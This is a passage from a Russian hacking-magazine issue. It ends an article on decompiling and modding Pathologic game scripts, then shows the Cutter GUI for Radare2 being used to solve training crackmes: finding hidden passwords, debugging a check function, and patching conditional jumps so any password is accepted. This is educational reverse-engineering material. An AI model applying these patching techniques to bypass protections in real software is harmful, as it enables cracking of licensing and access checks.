это ситуация, когда игрок жмет кнопку действия. Код начинается со смещения
0x7 и запускает функцию ActivateSleepMode, то есть открывает меню
для выбора нужного времени сна.


item_milk.bin
Посмотрим на код объекта «молоко»:


Strings:
    drink
    hunger
    add


Import:
    PlaySound (1 args)
    HasProperty (2 args)
    GetProperty (2 args)
    SetProperty (2 args)
    CreateFloatVector (1 args)
    SendWorldWndMessage (2 args)


RunOp = 0x0
RunTask = 0

Список команд слишком длинный для цитат, я приведу возможную трассу
исполнения:


0x0: Push("drink")
0x1: @ PlaySound(Stack[-1])
0x2: Pop(1)
0x3: PushEmpty(bool, string, float, float, float)
0x4: Stack[-4] = "hunger"
0x5: Stack[-3] = (float) -0.07
0x6: Stack[-2] = (int) 0
0x7: Stack[-1] = (int) 1
0x8: Call2 0xf


0xf: PushEmpty(bool, float, bool, float)
0x10: @ HasProperty(Stack[-8], Stack[-2])
0x11: Pop(0)
0x12: Stack[-2] = !Stack[-2]
0x13: IF (Stack[-1] == 0) GOTO 0x16; Pop(1)


0x16: @ GetProperty(Stack[-8], Stack[-1])
0x17: Pop(0)
0x18: PushEmpty(float, float, float, float)
0x19: Stack[-3] = Stack[-5] + Stack[-11]
0x1a: Stack[-2] = Stack[-10]
0x1b: Stack[-1] = Stack[-9]
0x1c: Call2 0x22


0x22: PushEmpty()
0x23: Pop(0); Push((bool) Stack[-3] < Stack[-2])
0x24: IF (Stack[-1] == 0) GOTO 0x27; Pop(1)


0x25: Stack[-4] = Stack[-2]
0x26: Return(0)


0x1d: Pop(3)
0x1e: @ SetProperty(Stack[-9], Stack[-1])
0x1f: Pop(1)
0x20: Stack[-9] = (bool) 1
0x21: Return(4)

В начале скрипта через функцию PlaySound проигрывается звук drink. Даль‐
ше проверяется значение атрибута hunger, и если голод существует, то
из него вычитается 0,07. Теперь ты знаешь, как работает бутылка молока.
А еще мы убедились, что декомпилятор работает без ошибок.


ИЗВЕСТНЫЕ МОДИФИКАЦИИ

Для начала я решил посмотреть, какие вообще существуют модификации
для «Мора». Оказалось, что большинство серьезных модов базируется на Rat
Fog Editor. Какой‑то безумец методично правил все байты скрипта weather.
bin, пока не вывел закономерность в реакциях игры на изменения.


0x3: Pop(0)
0x4: Push("night_bk.tex")
0x5: Push("night_ft.tex")
0x6: Push("night_lt.tex")
0x7: Push("night_rt.tex")
0x8: Push("night_up.tex")
0x9: Push("night_rain_bk.tex")
0xa: Push("night_rain_ft.tex")
0xb: Push("night_rain_lt.tex")
0xc: Push("night_rain_rt.tex")
0xd: Push("night_rain_up.tex")
0xe: Push((bool) 0)
0xf: Push(CVector(0.0, 0.0, 0.0))
0x10: Push(CVector(0.27451, 0.27451, 0.27451))
0x11: Push((float)3000.0)
0x12: Push((float)5000.0)
0x13: Push(CVector(0.19608, 0.19608, 0.19608))
0x14: Push(CVector(0.19608, 0.19608, 0.19608))
0x15: @ ForceWeather(Stack[-17], Stack[-16], Stack[-15], Stack[-14],
Stack[-13], Stack[-12], Stack[-11], Stack[-10], Stack[-9], Stack[-8],
 Stack[-7], Stack[-6], Stack[-5], Stack[-4], Stack[-3], Stack[-2],
Stack[-1])
0x16: Pop(17)

Действительно, скрипт содержит множество значений типа  float, которые
отвечают за освещение, туман и цветокоррекцию.





                          Результат работы модификации

Код остальных декомпилированных скриптов ищи в моем репозитории, я соб‐
рал его от четырех различных версий игры.


СОЗДАНИЕ МОДИФИКАЦИИ

Первое, что пришло мне в голову, — изменить содержимое городских урн.
Согласно игре, основная функция лечащего врача — копаться в помойках.
Облегчим ношу Бакалавра Данковского, разместив в каждой урне по целеб‐
ному порошочку. Для этого откроем скрипт urna.bin.


0x0: PushEmpty(float, float)
0x1: Push((bool) 1)
0x2: @ SetVisibility(Stack[-1])
0x3: Pop(1)
0x4: PushEmpty()
0x5: Call2 0x1a


0x1a: @ RemoveAllItems()
0x1b: Pop(0)
0x1c: PushEmpty(string, int, int, int)
0x1d: Stack[-4] = "bottle_empty"
0x1e: Stack[-3] = (int) 1
0x1f: Stack[-2] = (int) 2
0x20: Stack[-1] = (int) 2
0x21: Call2 0x38


0x38: PushEmpty(int, bool, int, bool)
0x39: PushEmpty(bool, int, int)
0x3a: Stack[-2] = Stack[-10]
0x3b: Stack[-1] = Stack[-9]
0x3c: Call2 0x47


0x47: PushEmpty(int, int)
0x48: @ irand(Stack[-1], Stack[-3])
0x49: Pop(0)
0x4a: Stack[-5] = (bool) Stack[-1] < Stack[-4]); Pop(1)
0x4b: Return(2)


0x3d: Pop(2)
0x3e: IF (Stack[-1] == 0) GOTO 0x46; Pop(1)


0x3f: @ irand(Stack[-2], Stack[-5])
0x40: Pop(0)
0x41: Push((int) 0)
0x42: Push((int) 1)
0x43: Stack[-4] += Stack[-1]
0x44: @ AddItem(Stack[-3], Stack[-10], Stack[-2], Stack[-1])
0x45: Pop(2)
0x46: Return(4)

Скрипт считает вероятность появления предмета в урне, и если игроку везет,
то через функцию AddItem в урну добавляется объект bottle_empty, то есть
пустая бутылка. Подсмотрев в другом скрипте имя powder — название объ‐
екта «порошочек», заменим в скрипте одну строку другой.





       Интерфейс альфа‑версии немного отличается от привычного


ВЫВОДЫ

Публикация отладочной информации вместе с игрой открыла дорогу к вос‐
становлению кода и созданию модификаций для множества игр.





           Так выглядели оригинальные скрипты до компиляции

До создания полноценного SDK еще много работы, но начало положено.
Декомпилятор далек от идеала, не все команды отображаются корректно.
Следующим шагом будет декомпиляция в С‑подобный код вроде Hex-Rays.
Сегодня мы обрели бесценный опыт реверса софта на C++, а комьюнити
получило инструмент для создания новых модов, пусть пока еще и сырой.
ВЗЛОМ





Дизассемблирование  и  отладка   прог‐
рамм — весьма непростой и трудоемкий
процесс, а значит, заниматься этим нужно
с комфортом. Этот самый комфорт вместе
с удобным интерфейсом и предлагает спе‐     Юрий "yurembo" Язев                                                                                    Программист, разработчик
циальная надстройка для Radare2 под наз‐        видеоигр, независимый                                                                                            исследователь
ванием Cutter. Как она работает? Сейчас                 t2d-dev.ru
разберем на простых примерах.


Некоторое время назад мы во всех подробностях (с примером взлома сер‐
вера) обсудили фреймворк для анализа программного обеспечения Radare2.
На основе этого фреймворка усилиями сообщества была создана наворо‐
ченная среда с графическим интерфейсом, позволяющая видеть промежу‐
точные результаты разных процессов анализа и с удобством ими управлять.
   Эта среда позволяет настраивать параметры с помощью визуальных ком‐
понентов и свободно перемещаться по разным листингам во время анализа,
а также настраивать поведение среды. Не секрет, что это сделало хакинг
(оговорился: анализ безопасности программ) более дружественным и наг‐
лядным.
   Сначала разработчики Radare2 выпустили в свет iaito. Через некоторое
время его форкнула группа Rizin, сделала несколько надстроек и опубликова‐
ла под названием Cutter. Эти усовершенствования настолько понравились
общественности, что народная слава сделала Cutter популярнее прароди‐
теля.
   Среди самых крутых фич стоит отметить хотя бы то, что в Cutter до ума (с
некоторыми  оговорками)  доведен  отладчик,  добавлена  консоль  Rizin,
в которой можно выполнять команды фреймворка Radare2 (или его бра‐
та‑близнеца — фреймворка Rizin). Оговорки относятся к работе отладчика
в Linux. В следующем разделе рассмотрим их подробнее.


УСТАНОВКА CUTTER В LINUX

Ранее я уже рассказывал про анализ и взлом приложений для Linux. Если
тебе нужен материал об исследовании программ для Windows, практическом
анализе защиты и внутренностях операционной системы, направляю тебя
на монументальный труд Криса Касперски, переизданный в соавторстве
со мной: «Фундаментальные основы хакерства. Анализ программ в среде
Win64».
   Существуют версии Cutter под все распространенные операционные сис‐
темы. Чтобы выбрать нужную, переходим на официальный сайт проекта
Cutter, мотаем страницу вниз, видим возможность скачать Cutter во всех дос‐
тупных вариантах: для Linux — в формате распространения переносимых при‐
ложений (.AppImage), в zip-архиве — для Windows и образ инсталляционного
диска (.dmg) — для macOS. Еще можно перейти на страницу проекта
в GitHub, скачать исходники и сбилдить проект from scratch.





   Образы для скачивания приложения под любую операционную систему

Установка Cutter в Windows и macOS проходит гладко, а итоговая тулза
работает довольно стабильно. Между тем в Linux все не так безоблачно.
На первый взгляд, установленный любым доступным образом Cutter работает
в Linux вполне сносно. Однако, запустив под отладчиком более или менее
солидную по размерам программу и сделав несколько шагов по трассе кода,
ты с удивлением увидишь, что Cutter бесповоротно крашится. В момент
запуска отладки Cutter сообщает о том, что отладочный режим находится
в состоянии активной разработки со всеми вытекающими.
  Я провел тесты с разными дистрибутивами Linux, на разных виртуальных
машинах, на реальном железе — везде одно и то же: Cutter безбожно падал.
Я загружал Cutter из разных источников, пробовал собирать его из исходни‐
ков. Однако результат оставался прежним. Даже скачанный с сайта раз‐
работчика «полностью укомплектованный» бандл Cutter-x86_64.AppImage
не исправил ситуацию.
  В процессе поисков и тестирования я наткнулся на менеджер пакетов
openSUSE, а в нем, собственно, обнаружил нужный мне пакет Cutter-Re.
Начал тестировать его.





                 Страница менеджера пакетов openSUSE

OpenSUSE предлагает несколько вариантов установки множества пакетов
для разных версий Linux. Там можно получить бинарники Cutter напрямую.
Не советую, проигрышный вариант. Лучше установить программу вручную:


echo 'deb http://download.opensuse.org/repositories/home:/RizinOrg/
xUbuntu_22.04/ /' | sudo tee /etc/apt/sources.list.d/home:RizinOrg.
list
curl -fsSL https://download.opensuse.org/repositories/home:RizinOrg/
xUbuntu_22.04/Release.key | gpg --dearmor | sudo tee /etc/apt/
trusted.gpg.d/home_RizinOrg.gpg > /dev/null
sudo apt update
sudo apt install cutter-re

После выполнения этих несложных действий я получил стабильно работа‐
ющий Cutter, способный корректно выполнить отладку любого приложения.
  Из минусов в сравнении с версией, которую можно скачать с официаль‐
ного сайта, я заметил отсутствие декомпилятора, но при необходимости его
можно доустановить в качестве плагина. В этом случае придется переком‐
пилировать Cutter вместе с исходниками плагина. Но в рамках нашего сегод‐
няшнего исследования мы вполне обойдемся без декомпилятора, огра‐
ничившись дизассемблером.


             INFO

                     На момент написания статьи Cutter в менеджере
                        пакетов openSUSE еще не был заточен под пос‐
                    леднюю версию Ubuntu 24.04, поэтому я остался
                       на предыдущей версии ОС.


В случае если для корректной работы Cutter ты не желаешь переходить
на Ubuntu с другого Linux-дистрибутива, можешь заюзать iaito — официаль‐
ный графический интерфейс для Radare2. В нем отсутствуют некоторые фичи,
добавленные в Cutter, но без них вполне можно жить и успешно исследовать
программы в Linux. Неудобство доставит разве что отсутствие отладчика.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
    — CUTTER НА РАДАРЕ
             ИССЛЕДУЕМ ПРОГРАММЫ
          В ГРАФИЧЕСКОЙ НАДСТРОЙКЕ
                 CUTTER ДЛЯ RADARE2





ИСПЫТЫВАЕМ CUTTER — СТАТИЧЕСКИЙ АНАЛИЗ

Для испытания Cutter воспользуемся готовым набором крякмисов. Самый
известный   среди  реверс‑инженеров  источник   крякмисов —  сайт
crackmes.one почил вечным сном как раз во время подготовки статьи. Что ж,
свято место пусто не бывает. Воспользуемся набором крякмисов от Леоноры
Тиндол (программиста, хакера, Rust-кодера и автора двух книг по языку Rust)
aka Nora Codes.
   Как говорит сама разработчица комплекта, «Don’t ruin  it for yourself by
reading the source code!» («Не портите себе жизнь чтением исходного кода!»),
следовательно, скачав с GitHub’а файлы, не погружаясь в их исходники, в кон‐
соли выполняем команду make  crackme* в зависимости от того, крякми
под каким номером тебе нужен.





                             Репозиторий Норы

Для начала я предлагаю рассмотреть функциональность Cutter на элемен‐
тарном примере. Сбилдим крякми под номером 01e. Запустив этот крякми
на выполнение командой ./crackme01e.64, ты обнаружишь, что в параметре
командной строки требуется указать пароль.





   Исходник первого крякми со скрытым паролем (чтобы интереснее было)

Настало время расчехлить ранее установленный Cutter и отправиться в увле‐
кательное путешествие. После  загрузки  Cutter в пригласительном окне
выбираем только что скомпилированный файл crackme01e.64.





                        Пригласительное окно Cutter

В следующем окне можно настроить параметры первичного анализа откры‐
ваемого файла. Единственное, что нас может здесь заинтересовать, —
это флажок «Загрузить в режиме записи (-w)». В большинстве случаев файлы
открываются для анализа без необходимости внесения в них изменений.
Однако в данном случае я предлагаю установить этот флажок, так как мы
будем резать файл по живому.





                            Параметры загрузки

Наконец откроется главное окно приложения. Именно с этим окном ты
будешь иметь дело на протяжении практически всего времени исполь‐
зования программы. Посмотрим на самые полезные вкладки.





                        Cutter: основное окно приложения

На первой странице — Dashboard — мы можем наблюдать общую информа‐
цию об открытом файле:
 • путь к файлу;
 • формат;
 • разрядность;
 • установленный для файла режим (чтение/запись/выполнение);
 • размер;
 • тип;
 • язык, на котором написана программа;
 • архитектура;
 • операционная система;
 • устройство;
 • компилятор;
 • другие параметры.

Ниже представлены разные варианты хешей, используемые приложением
системные библиотеки (в нашем случае только одна — libc), далее присутс‐
твует целый раздел с информацией об анализе: сколько функций было обна‐
ружено в программе, перекрестные ссылки, вызовы и прочее.
  На вкладке Strings приведены все строки, содержащиеся в препари‐
руемом файле. Наметанным глазом среди названий системных функций,
библиотек, секций файла и сообщений для пользователя мы можем обна‐
ружить строчку, напоминающую искомый пароль.





         Подозрительная, выбивающаяся из основного потока строка

Проверим нашу догадку. Ты можешь пока закрыть Cutter, в противном случае
крякми нельзя будет запустить на выполнение из‑за того, что он занят другим
процессом. Не забудь только сохранить свой Cutter-проект исследования.
  При вводе ./crackme01e.64 slm!paas.k получаем от командной оболоч‐
ки (в моем случае bash) сообщение «!paas.k: event not found». Быстро сооб‐
ражаем, что последовательность символов после знака  ! bash пытается
выполнить как команду. Предваряем управляющий символ обратным слешем:
./crackme01e.64 slm\\!paas.k.





                            Тестирование крякми

Пароль найден, путь к полезной части программы открыт. Между тем я при‐
зываю тебя продолжить изучение функциональности Cutter с использованием
этого же крякми.
  На  вкладке  Imports  перечислены  импортированные  извне  объекты,
в нашем случае — функции с указанием их адреса и библиотеки‑источника.
Вкладка Search служит для поиска по всему проекту — дизассемблируемому
файлу. На вкладке Disassembly представлен полный дизассемблированный
листинг загруженной программы. Содержимое вкладки Graph визуально пов‐
торяет код с предыдущей вкладки и невероятно полезно при изучении дизас‐
семблированного листинга.
   Здесь листинг представлен очень удобным образом: код функции раз‐
мещается в отдельных прямоугольниках — кадрах, которые последовательно
соединены стрелками. Решение о том, чтобы вынести код в отдельный кадр,
принимается на основе ветвления — условных операторов. В результате
выделения одинаковым цветом  оператора перехода и соответствующей
стрелки код выглядит очень наглядно. Таким образом разные пути выпол‐
нения машинного кода отчетливо различимы.





                               Cutter: вкладка Graph

Вкладка Hexdump содержит шестнадцатеричный дамп — ни больше ни мень‐
ше. В случае когда декомпилятор не установлен, вкладка Decompiler пуста.
  Из оставшихся вкладок стоит отметить следующие. Вкладка Functions
содержит список заголовков всех обнаруженных в рассматриваемой прог‐
рамме функций. По каждому из этих заголовков можно кликнуть, в результате
чего на вкладке «Дизассемблер» или «Граф» отобразится содержимое выб‐
ранной функции.





                              Вкладка Functions

На вкладке Stack отображается содержимое стека на текущий момент.





                                Вкладка Stack

На вкладке Backtrace демонстрируется обратный стек — обратная пос‐
ледовательность вызовов функций, приведшая к текущему положению дел
в программе.





                             Вкладка Backtrace

Вкладка Threads содержит список выполняемых в текущий момент програм‐
мных потоков. Вкладка Heap отображает содержимое динамической области
памяти — кучи.
  На вкладке Registers отображается содержимое регистров процессора,
используемых активным потоком (их список ты найдешь на вкладке Threads).





                              Вкладка Registers

Вкладка Breakpoints содержит список, в который попадают все поставленные
бряки. Если заранее поставить точку останова, с помощью этого списка мож‐
но быстро перейти к месту исследования, особенно это удобно, когда лис‐
тинг исследуемой программы огромный.
  И последняя вкладка, которую мы рассмотрим, — это Console. Она вклю‐
чает два режима, выбираемых из выпадающего списка. Первый — Rizin
Console — позволяет вводить команды фреймворка Rizin и получать резуль‐
тат их выполнения. Второй — Debugee Input — предоставляет возможность
вводить данные в отлаживаемое консольное приложение.
  На будущее сохрани исполняемый файл для следующих экспериментов,
чтобы не пришлось вновь компилировать бинарник.


Способы взлома программы
Найти нужный пароль — это все‑таки половина дела. Настоящий взлом —
это когда ты что‑то модифицируешь в кишках программы с целью добиться
полезного результата. Cutter предлагает несколько крутых средств для этого.
   Первым делом, зная пароль, найдем в программе место, где он исполь‐
зуется. Почти наверняка это будет сравнение введенного пользователем
пароля с эталонным. Следовательно, исход этой операции мы вправе изме‐
нить. Находясь на вкладке Strings, на найденном пароле вызови контекстное
меню, в котором выбери пункт Show X-Refs.





                        Пункт меню Show X-Refs

Откроется окно, в котором слева будут перечислены строчки, где использует‐
ся выбранная строка, а справа отображен участок листинга, где она присутс‐
твует.





                         Окно перекрестных ссылок

Достаточно щелкнуть мышью на строке в левой части окна, чтобы отобразить
ее на вкладке Disassembly. Переходим на вкладку Graph, где вся последова‐
тельность действий предстает перед глазами.





      Выполнение программы зависит от значения переданной строки

В регистрах RSI и RDI находятся строки для сравнения: в первом — введен‐
ная пользователем, во втором — «зашитая» в программе. Далее вызывается
функция strncmp из стандартной библиотеки языка C, ей в качестве парамет‐
ров передается содержимое двух обозначенных выше регистров. Эта фун‐
кция сравнивает переданные строки, и если они равны, то в регистр EAX воз‐
вращается нуль.
   Собственно, команда TEST проверяет, чтобы в EAX был 0. Если условие
выполняется, управление передается в правый кадр — по зеленой стрелке.
Обрати внимание, команда условного перехода JE также зеленого цвета.
   Теперь перепишем команду с точностью до наоборот, чтобы она принима‐
ла неправильные пароли, но отвергала правильный. Для этого вызовем кон‐
текстное меню на строке с условным переходом, а затем выберем пункт Edit
→ Reverse Jump.





           Контекстное меню команды, которую мы хотим обратить

Переход будет заменен.





                           Переход обратился





    Crackme принимает любые пароли, исключая заведомо правильный

Если  бы  нужная  нам  корректная  ветка  кода  шла  непосредственно
за условным оператором, мы могли бы заменить это условие ничего не дела‐
ющими операторами NOP. Но в рассматриваемом крякми это не так. Между
тем, если такой случай подвернется, Cutter умеет подставить на место
заменяемого оператора нужное количество NOP.
  В дополнение к этому Cutter позволяет просто переписать оператор.
Перейди к сохраненному бинарнику или скомпилируй новый. Загрузи его
в Cutter. На вкладке «Дизассемблер» или «Граф», используя описанные выше
шаги, перейди к условию корректности введенной строки.
   Можно,  конечно, перейти  к нужному  месту любым другим образом.
Вызови контекстное меню над строкой je 0x11f0 и выбери пункт Edit →
Instruction. Откроется окно редактирования этой инструкции. Исправь опе‐
ратор je на jmp: тем самым условный оператор превратится в безусловный
переход.





                      Делаем безусловный переход





  Теперь крякми принимает абсолютно любые пароли, в том числе пра‐
  вильный




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
    — CUTTER НА РАДАРЕ
             ИССЛЕДУЕМ ПРОГРАММЫ
          В ГРАФИЧЕСКОЙ НАДСТРОЙКЕ
                 CUTTER ДЛЯ RADARE2





ДИНАМИЧЕСКИЙ АНАЛИЗ

Многое можно сделать, применяя только статический анализ. Однако иногда
удобнее один раз прогнать программу, чтобы увидеть, что она делает. Cutter
и в этом случае может выручить, учитывая описанные в первом разделе
статьи траблы.
   Попробуем решить crackme03. Загрузи его в Cutter. Беглый просмотр
вкладки Strings не выявил каких‑либо интересных строк. Погрузимся в дизас‐
семблерный листинг.





                    Дизассемблерный листинг crackme03

Сразу же обращает на себя внимание объявление переменных, где Cutter
оставил комментарии: lAmB, dA. Компилятор часто разделяет одну строку
на несколько частей, помещая их в разные переменные (примеры этого при‐
ведены в моих статьях про Radare2). С помощью Cutter можно придать
переменным более осмысленный вид: щелкаем на целевой переменной пра‐
вой кнопкой мыши и выбираем пункт Add at... → Rename local имя перемен‐
ной.





  Контекстное меню для переименования переменной в дизассемблер‐
  ном листинге

Откроется окно для изменения имени или типа данных переменной.





                 Окно редактирования свойств переменной

Результат может выглядеть примерно так.




                   Результат переименования двух переменных

Честно сказать, переименование реализовано плохонько, поскольку оно воз‐
действует  исключительно на текущий  объект без  поиска  одноименных
переменных в рассматриваемой области видимости.
   Возможно, lAmBdA — решение нашего вопроса и нам не надо прибегать
к помощи тяжелой артиллерии. Проверим с сохранением регистра символов.





                             Некорректный пароль

Нетушки! Пароль неверный. Что ж, взглянем на дизассемблерный код фун‐
кции main.





                Часть дизассемблированной функции main

На скриншоте показана интересующая нас в данный момент часть функции
main. Выше находится условие проверки присутствия в командной строке
параметра, а ниже — эпилог функции. Под цифрой 1 на скриншоте показана
проверка длины введенного пользователем пароля: он должен состоять
из шести символов. Мы видим вызов функции strlen, а далее сравнение ее
результата со значением 6.
   Если значение отличается, выполняется переход к блоку вывода сооб‐
щения об ошибке. Можно прямо в дизассемблерном листинге оставить ком‐
ментарий. Для этого вызови контекстное меню на строке, к которой желаешь
добавить комментарий, и выбери из него пункт Add comment или используй
горячую клавишу «точка с запятой». Откроется окно с полем редактирования,
в котором можно ввести нужный комментарий.





                     Окно редактирования комментария

Если количество символов в введенной строке равно шести, совершается
переход в блок кода, из которого вызывается функция check_pw. По ее наз‐
ванию можно сделать вывод, что внутри выполняется проверка введенного
пароля. На этом месте мы выяснили, что пароль должен состоять из шести
символов.
   Чтобы добиться вывода сообщения об успешной проверке, мы можем
просто обратить условие, происходящее после вызова check_pw, но это
будет неспортивно. Нам же надо разобраться, что происходит с введенным
паролем внутри этой функции. Следует заметить, что ей передаются три аргу‐
мента. Для этого используются три регистра: RDI, RSI, RDX — все в соответс‐
твии с условиями передачи параметров в Unix-подобных ОС (System V ABI)
на аппаратной платформе AMD64.
   Если присмотреться к дизассемблерному листингу, окажется, что, кроме
значения первого аргумента (ссылка на строку, введенную пользователем),
передаваемого в регистре RDI, мы не можем быть уверенными больше ни в
одном. Значения остальных аргументов мы просто не можем установить:
Cutter насоздавал кучу ничего не значащих переменных, которые никуда
не ведут. Остается уповать на динамический анализ.
   Настало время расчехлить отладчик и поставить точку останова на вызов
функции check_pw, выбрав в контекстном меню Breakpoint → Add breakpoint
(или нажав клавишу F2).





                          Меню Breakpoint

Забегая вперед, отмечу, что по результату работы функции check_pw при‐
нимается очередное решение о выводе положительного или отрицательного
сообщения (условие под цифрой 2 на скриншоте «Часть дизассемблирован‐
ной функции main»).
   После этого для запуска отладки жмем F9. Всплывет окно, сообщающее,
что Debug is currently in beta. Оно будет показано только единожды за сеанс
работы с Cutter. Следом появится окно, в котором можно задать аргументы
командной строки. Так как в нашем случае в качестве аргумента используется
строка длиной шесть символов, введем что‑нибудь наподобие Kkris1.





               Окно добавления аргументов командной строки

Отладка начнется задолго до точки входа и функции main, ведь программе
перед своим выполнением надо временно прописаться в операционной сис‐
теме, предъявить требования на аппаратные ресурсы и получить сведения
об окружении. Поэтому смело можем все это пропустить и сразу перейти
к нашему бряку, нажав на значок Continue или F5 на клаве.
   Попав на вызов check_pw, можно рассмотреть параметры этой функции:
вон они все как на ладони (см. скриншот «Часть дизассемблированной фун‐
кции main»). Если в Cutter взглянуть на вкладку Registers, на месте значений
избранных регистров, с помощью которых передаются параметры (RDI, RSI,
RDX), мы обнаружим  шестнадцатеричные  указатели на области памяти.
К счастью, нам не надо самостоятельно искать в памяти значения, на которые
они указывают, в Cutter этот процесс автоматизирован. Щелкни на имени
(или поле редактирования) нужного регистра и из контекстного меню выбери
Show in → Hexdump.





                          Пункт меню Hexdump

Откроется вкладка, где курсор будет установлен в соответствии с указателем
из выбранного регистра.





           Указатель на область введенного пользователем пароля

Введенный пользователем пароль мы и так знали, а область определили
в дизассемблере, поэтому этот кейс послужил нам для проверки. Соответс‐
твующим образом определим, на какие данные указывают значения двух дру‐
гих регистров — RSI и RDX.





      lAmBdA передается в функцию check_pw во втором аргументе




                               Третий аргумент

Третий аргумент вызывает неслабую фрустрацию. Cutter выделил составля‐
ющие аргумент компоненты синим цветом (на скриншоте выше они обведены
рамкой). Также по отображению Cutter видно, что ни один компонент не явля‐
ется буквой или символом. Простой набор цифр? Похоже на массив — неп‐
рерывную последовательность. На всякий случай выпишем ее в текстовый
файл (или на бумажку, как удобнее): 2, 3, 2, 3, 5.
   Вернемся к месту вызова check_pw. Для этого надо сделать несколько
шагов назад (кнопка Go back в интерфейсе Cutter) и переключить вкладку
(например, на Graph — признаться, я к ней привык, наглядно видны ветвления
и переходы, лучше, чем стрелочки на вкладке Disassembly). Далее провали‐
ваемся внутрь функции по нажатию на клавишу F7 (шаг отладчика с заходом
внутрь).





                Функция check_pw в графе дизассемблера

Теперь можно включить трассировку.



                              Запуск трассировки

Включение режима записи трассировки позволяет шагать по трассе кода
не только вперед по программе, но и назад. Таким образом можно легко вер‐
нуться на несколько шагов и проверить, какие значения были у переменных
и в регистрах в прошлом, без перезапуска отладчика и прокручивания прог‐
раммы до необходимого момента. Короче, крайне удобная штука.
  Но это не бесплатно. За это придется заплатить оперативной памятью,
поэтому для комфортной работы понадобится минимум 8 Гбайт. В настоящее
время такой объем есть на подавляющем большинстве компов, однако, если
отладка происходит в  виртуалке, память еще нужна основной системе,
как минимум столько же.
  Имей в виду, что запись трассы, как и сама отладка, может работать
не всегда корректно. Например, после включения записи трассы перестает
работать команда Continue. В результате мы получаем урезанный отладчик
с возможностью сделать шаг вперед или назад, но не «более» или «далее».
  Из поверхностного взгляда на граф функции check_pw можно сделать
пару  умозаключений.  Во‑первых,  длинная зеленая  стрелка,  выходящая
из второго снизу блока и указывающая на второй сверху блок, означает цикл
с постусловием. Во‑вторых, три почти идентичных блока кода


mov eax, <возвращаемое число>
ret

по сути представляют собой эпилоги функции. Два из них возвращают еди‐
ницу, а третий — нуль. Если обратиться к скриншоту «Часть дизассембли‐
рованной функции main», можно заключить, что положительное сообщение
выводится в случае возврата функцией check_pw единицы, тогда как сооб‐
щение о провале выводится, когда функция возвращает нуль.
   Последняя строчка верхнего блока кода обнуляет регистр EAX. Из этого
следует, что он (в своих вариациях RAX/EAX), вероятно, будет использоваться
как счетчик в цикле, наличие которого мы уже определили.
  В первой строчке второго блока в графе функции check_pw происходит
копирование одного байта из области памяти, на которую указывает [RDX +
RAX]. То есть одного символа третьего параметра, которым является мас‐
ка — массив символов, состоящий из цифр. Порядковый номер символа
в массиве определяется значением регистра RAX.
  В первом прогоне этого цикла RAX равен 0, значит, из параметра выбира‐
ется первый символ (загляни в заготовленный файлик или бумажку), это циф‐
ра 2. Выбранное значение помещается в регистр ECX. Суть инструкции MOVZX
(дополнительно к обычному копированию — MOV) — дополнить нулями зна‐
чение более низкой разрядности (в нашем случае байт) до более высокой (в
нашем случае двойное слово — 32 байта). В результате этой манипуляции
скопированный символ — цифра — помещается в самую младшую часть
регистра RCX — CL.





                  Условное представление регистра RCX

Следующая инструкция прибавляет сохраненное в CL значение к байту [RSI
+ RAX], выбранному аналогичным способом из второго параметра — строки
lAmBdA. Для первого прогона это символ l. В таблице символов ASCII
для английского языка, без изменений вошедшей в UTF-8, которая по умол‐
чанию используется в Unix-подобных системах, этому символу соответствует
шестнадцатеричный код 0x6C (с учетом регистра символа). При этом в CL
находится значение 2. Следовательно, 0x6C + 0x2 = 0x6E, что в той же таб‐
лице UTF-8  соответствует символу n. Заменили новым значением име‐
ющееся в регистре CL. Запомни или запиши этот момент.
  В третьей инструкции сначала уже рассмотренным образом извлекается
символ из параметра 1 — [RDI + RAX], в котором передан введенный поль‐
зователем пароль (у нас это Kkris1). Затем его код сравнивается с кодом
из регистра CL, происходит простое сравнение символов. Для этого инструк‐
ция CMP выполняет вычитание операндов. В итоге, если они равны, получа‐
ется нуль, если больше или меньше, то, соответственно, больше или меньше
нуля.
   Следующая инструкция, JNE, осуществляет переход по указанной метке (в
блок выхода), когда CMP возвращает отличное от нуля значение. Это произой‐
дет в случае, если символы не равны, из чего следует, что и строки не равны
и нам пора закругляться с возвращением в вызывающую функцию нуля.
   Проверим нашу догадку. Запустим отладку, только в качестве первого
символа пароля введем n: n01234. Есть контакт! Выполнение программы
пошло по другому пути, где происходит сверка суммы номера текущего сим‐
вола строки‑лямбды + 1 с нулем. Если условие выполняется, по инструкции
JE происходит переход в блок кода, осуществляющий выход из функции
с  возвращением  единицы. И  это  означает  положительный  исход,  так
как пройдена вся проверочная строка‑лямбда.
   Продолжим дебажить. И естественным образом проваливаемся в про‐
тивоположный блок кода, потому что в данном конкретном случае сумма
индекса текущего символа строки‑лямбды и единицы не дает нуль. Очевидно,
эта сумма будет равна нулю только в том случае, когда индекс равен пос‐
леднему символу строки, за которым по определению следует нуль.
  В первой строчке нового блока кода значение в регистре RAX инкремен‐
тируется. Сразу за ней происходит проверка текущего индекса символа
пользовательской строки — [RDI + RAX] — на равенство нулю. Если это так,
значит, проверен каждый символ введенной юзером строки и дальше нечего
делать, так как строки равны. Выполняется выход из функции с возвратом
единицы. В противном случае осуществляется возврат во второй блок кода,
то есть в начало функции, — тело цикла повторяется.
  В нашем примере при таком введенном пароле (n01234) выход из фун‐
кции произойдет уже на второй итерации. Но теперь мы выяснили назначение
последовательности цифр (третий параметр) и можем их применить к строке
lAmBdA (второй параметр) в соответствии с восстановленным алгоритмом
кодирования символов в программе.
   Итак, первый символ мы уже выяснили — это n. Далее нам надо, соблюдая
регистр, выяснить остальные символы. Мы знаем, что общее количество сим‐
волов равно шести. Также мы знаем, что символы в строках перебираются
последовательно слева направо, при этом порядковый номер символа оди‐
наковый для всех обрабатываемых строк.  Соответственно, код символа
под номером m увеличиваем на значение, находящееся в массиве в позиции
m. А дальше простая арифметика. Для определения кода любого латинского
символа воспользуемся таблицей ASCII.





                          Таблица ASCII-символов

 1. l + 2 = 0x6C + 0x2 = 0x6E = n
 2. A + 3 = 0x41 + 0x3 = 0x44 = D
 3. m + 2 = 0x6D + 0x2 = 0x6F = o
 4. B + 3 = 0x42 + 0x3 = 0x45 = E
 5. d + 5 = 0x64 + 0x5 = 0x69 = i
 6. A + 0 = 0x41 + 0x0 = 0x41 = A

Для последнего символа в строке‑маске отсутствует слагаемое, так как она
содержит только пять цифр в противоположность шести символам в стро‐
ке‑лямбде.
   Пароль найден, крякми раскрыт! Запусти оригинальный, немодифици‐
